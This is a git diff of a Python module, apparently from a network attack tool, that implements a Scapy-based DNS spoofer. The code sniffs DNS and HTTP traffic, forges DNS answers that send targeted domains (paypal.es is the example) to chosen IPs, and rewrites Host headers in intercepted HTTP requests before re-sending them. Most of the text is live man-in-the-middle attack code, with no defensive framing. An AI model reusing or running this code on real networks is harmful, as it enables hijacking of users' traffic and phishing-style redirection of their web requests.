@@ -4,8 +4,7 @@ from scapy.all import *
 from src import files, packet_utilities
 from src.log import log
 
-#TODO: CAMBIAR LO QUE HAY POR GETHOST EN EL HANDLE HTTP PACKET
-#TODO: CAMBIAR LISTAS POR TUPLAS EN LAS REDIRECTS
+#Cuando se envia un spoofed packet, no se guarda en handled packets. Lo recibo varias veces??
 
 class DNS_Spoofer(threading.Thread):
     """Thread of the DNS Spoofing module.
@@ -48,8 +47,8 @@ class DNS_Spoofer(threading.Thread):
         #paypal.es pokexperto.net
         #padventures.org 192.168.191.120
    
-        #parsed_redirects=                  {"paypal.es": ["45.60.23.55", "pokexperto.net"], "padventures.org": ["192.168.191.120", None]}
-        #default=                           ["93.184.216.34", "example.com"]
+        #parsed_redirects=                  {"paypal.es": ("45.60.23.55", "pokexperto.net"), "padventures.org": ("192.168.191.120", None)}
+        #default=                           ("93.184.216.34", "example.com")
         
     
     def _resolve_parsed_redirects(self, redirects):
@@ -64,12 +63,12 @@ class DNS_Spoofer(threading.Thread):
                 files.parse_domains_and_ips
                 
         Returns:
-            tuple: a tuple which contains the redirects dictionary and a list
+            tuple: a tuple which contains the redirects dictionary and a tuple
                 with the default redirect. The redirects_dictionary structure
                 is now:
-                    {domain_redirected:[ip_to_redirect, domain_to_redirect],..}
+                    {domain_redirected:(ip_to_redirect, domain_to_redirect),..}
                 and the default redirect is now:
-                    [ip_to_redirect, domain_to_redirect]
+                    (ip_to_redirect, domain_to_redirect)
                 
         Examples:
             FILE READ BY files.parse_domains_and_ips
@@ -85,36 +84,37 @@ class DNS_Spoofer(threading.Thread):
                 (redirect_dictionary, default_redirect)
                 
             WHERE redirect_dictionary IS
-                {"paypal.es": ["45.60.23.55", "pokexperto.net"], "padventures.org":
-                    ["192.168.191.120", None]}
+                {"paypal.es": ("45.60.23.55", "pokexperto.net"), "padventures.org":
+                    ("192.168.191.120", None)}
                     
             WHERE default_redirect IS
-                ["93.184.216.34", "example.com"]
-                
+                ("93.184.216.34", "example.com")
         """
-        #Redirect before default=   {"*": ["93.184.216.34", "example.com"], "paypal.es": ["45.60.23.55", "pokexperto.net"], "padventures.org": ["192.168.191.120", None]}
+        
         
         new_redirects = {}
         
         for domain, supposed_ip in redirects.items():
-            if supposed_ip == "*":
-                new_redirects[domain] = ["*",  "*"]
+            if supposed_ip == "*": #if the IP is * (which means ignore)
+                new_redirects[domain] = (None, None)
                 continue
             
             if not packet_utilities.is_it_an_ip(supposed_ip): #supposed_ip is actually a domain
                 log.dns.info("resolve1", supposed_ip=supposed_ip)
                 true_ip = packet_utilities.nslookup(supposed_ip)
-                
-                if true_ip: log.dns.info("resolve2", supposed_ip=supposed_ip, true_ip=true_ip)
-                else: log.dns.error("resolve", supposed_ip=supposed_ip)
-                
-                redirect = [true_ip, supposed_ip]
-            else:
-                redirect = [supposed_ip, None]
+                if true_ip: #we could resolve the domain
+                    log.dns.info("resolve2", supposed_ip=supposed_ip, true_ip=true_ip)
+                    new_redirects[domain] = (true_ip, supposed_ip)
+                else: #we could not resolve the domain
+                    log.dns.error("resolve", supposed_ip=supposed_ip)
+                    new_redirects[domain] = (None, None)
+            else: #supposed_ip is an ip
+                new_redirects[domain] = (supposed_ip, None)
             
-            new_redirects[domain] = redirect.copy()
-            
-        default = new_redirects.pop("*", [None,None]) #si hay un default, lo quita y lo devuelve. si no, devuelve [None, None]
+        #Redirect before taking out default:
+        #{"*": ("93.184.216.34", "example.com"), "paypal.es": ("45.60.23.55", "pokexperto.net"), "padventures.org": ("192.168.191.120", None)}
+        
+        default = new_redirects.pop("*", (None,None)) #if there's a default, it takes it out and sets 'default' to it. else, sets 'default' to (None, None)
         
         return new_redirects, default
 
@@ -124,7 +124,7 @@ class DNS_Spoofer(threading.Thread):
         
         It is decided depending on whether the domain asked is one of the 
         targets or not. If it should be answered, it returns 
-        [IP_to_redirect, domain_to_redirect]. If it should not be answered, it
+        (IP_to_redirect, domain_to_redirect). If it should not be answered, it
         simply returns False.
         
         Parameters:
@@ -132,20 +132,17 @@ class DNS_Spoofer(threading.Thread):
                 request is asking for.
                 
         Returns:
-            list: a list which contains [IP_to_redirect, domain_to_redirect].
+            tuple: a tuple which contains (IP_to_redirect, domain_to_redirect).
                 Note that domain_redirect can be None.
             False: if the domain should not be spoofed.
         """
         
         for d in self.parsed_redirects.keys(): #if it is an specific rule, it looks for it
             if d in domain_queried:
-                if self.parsed_redirects[d][0] == "*": #if the IP is *, it won't be redirected
-                    return [None, None]
-                else:
-                    return self.parsed_redirects[d]
+                return self.parsed_redirects[d]
                 
         #if it is not a rule, then the default value is returned
-        #this default value can be [None, None]
+        #this default value can be (None, None)
         return self.default        
     
     
@@ -165,7 +162,7 @@ class DNS_Spoofer(threading.Thread):
         Returns:
             bool: True if it has already been handled, False otherwise. 
             """
-        result = self.handled_http_packets.count([ack,seq,has_raw])
+        result = self.handled_http_packets.count((ack,seq,has_raw))
         
         return True if result > 0 else False
 
@@ -194,45 +191,29 @@ class DNS_Spoofer(threading.Thread):
             spoofed_host (str): the string that will replace host
         """
         
-        p = IP(dst=packet["IP"].dst, src=packet["IP"].src)/ \
+        p = IP(dst=packet["IP"].dst, src=packet["IP"].src, flags=packet["IP"].flags)/ \
             TCP(dport=packet["TCP"].dport, sport=packet["TCP"].sport, ack=packet["TCP"].ack, seq=packet["TCP"].seq, flags=packet["TCP"].flags)/ \
             Raw(load=packet.load.replace(host.encode("utf-8"), spoofed_host.encode("utf-8")))
         
-        #ORIGINAL ACK: 620
-        #MY ACK: 622
         
-        if len(p.load) > len(packet.load):
+        #There's a problem when the load is increased, because the client says that he has read
+        #more bytes than the bytes that the server had sent. There's no problem if he says
+        #that he has read less bytes, so we simply take out user agents to reduce load length.
+        if len(p.load) > len(packet.load): 
             diff1 = (packet["TCP"].seq + len(packet.load) - (p["TCP"].seq + len(p.load)))
-            
-            # ~ #SOL 1
-            
-            # ~ p["TCP"].seq -= (len(p.load)-len(packet.load))
-            # ~ self.handled_http_packets.append([p["TCP"].ack, p["TCP"].seq, p.haslayer("Raw")])
-            
-            # ~ diff = (packet["TCP"].seq + len(packet.load) - (p["TCP"].seq + len(p.load)))
-            # ~ print("Performing solution 1, difference is now", diff)
-            # ~ #SI BAJO EL SEQ DEL GET PARA QUE EL ACKN DEL ACK SEA CORRECTO, DEVUELVE 400 BAD REQUEST
-        
-            # ~ #SOL 2
-            # ~ p.load = p.load[:-(len(p.load)-len(packet.load))]
-            # ~ diff = (packet["TCP"].seq + len(packet.load) - (p["TCP"].seq + len(p.load)))
-            # ~ print("Performing solution 2, difference is now", diff)
-            
-            #SOL 3
             agent = packet_utilities.get_user_agents(p.load)
-            #new_agent = b"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0"
-            p.load = p.load.replace(agent, b"")
-            
+            p.load = p.load.replace(agent, b" ")
             diff2 = (packet["TCP"].seq + len(packet.load) - (p["TCP"].seq + len(p.load)))
             if diff2 < 0:
                 log.dns.error("len", diff1=diff1, diff2=diff2)
+
         send(p, verbose=0)
     
     
     def _add_handled_packet(self, packet):
         """Adds a packet to the list of handled packets.
         
-        It adds a list which contains the packet ack number, the packet seq 
+        It adds a tuple which contains the packet ack number, the packet seq 
         number and a boolean according to if the packet has raw layer or not.
         If this list is too large when a new packet is added (500+), first
         480 elements are removed.
@@ -241,11 +222,11 @@ class DNS_Spoofer(threading.Thread):
             packet (scapy.packet.Packet): handled packet
         """
         
-        self.handled_http_packets.append([packet.ack, packet.seq, packet.haslayer("Raw")])
+        self.handled_http_packets.append((packet.ack, packet.seq, packet.haslayer("Raw")))
         #print(len(self.handled_http_packets))
         if len(self.handled_http_packets) > 500:
             self.handled_http_packets = self.handled_http_packets[480:]
-            print("DNS handled http packets length exceeded 500. Cleaning to last 20...")
+            print("[DNS] handled http packets length exceeded 500. Cleaning to last 20...")
         
         
     def _handle_http_packet(self, packet):
@@ -265,9 +246,9 @@ class DNS_Spoofer(threading.Thread):
         if not self._has_packet_been_handled(packet.ack, packet.seq, packet.haslayer("Raw")):
             self._add_handled_packet(packet)
             
-            first_pos = packet.load.find(b"Host: ")+6
-            host = packet.load[first_pos:packet.load.find(b"\r\n",first_pos)].decode("utf-8", "ignore")
-            
+            host = packet_utilities.get_host(packet.load)
+            if not host:
+                print("failed getting host from", packet.load)
             spoofed_domain = self._get_redirect_for_domain(host)[1]
             
             if spoofed_domain: #si el host pedido tiene una redireccion a otro dominio:
@@ -388,7 +369,7 @@ class DNS_Spoofer(threading.Thread):
         #con lo que puede perder algun paquete en ese proceso (cuando escribo esto aun no se ha dado el caso)
         
         #          es un paquete DNS y es IP (hay algunos que son ICMP host redirect) o bien es tcp, y en la capa raw tiene GET o POST
-            sniff(filter="udp or tcp",
+            sniff(filter="udp or tcp and (dst port 80 or dst port 53 or src port 53)",
                   lfilter = lambda x: ((x.haslayer("DNS") and x.haslayer("IP")) or (x.haslayer("TCP") and x.haslayer("Raw") and ((b"POST" in x["Raw"].load) or (b"GET" in x["Raw"].load)))),
                   prn=self._handle_packet, store=False, timeout=self.timeout, stopperTimeout=3, stopper=self.exit_event.is_set)
                   
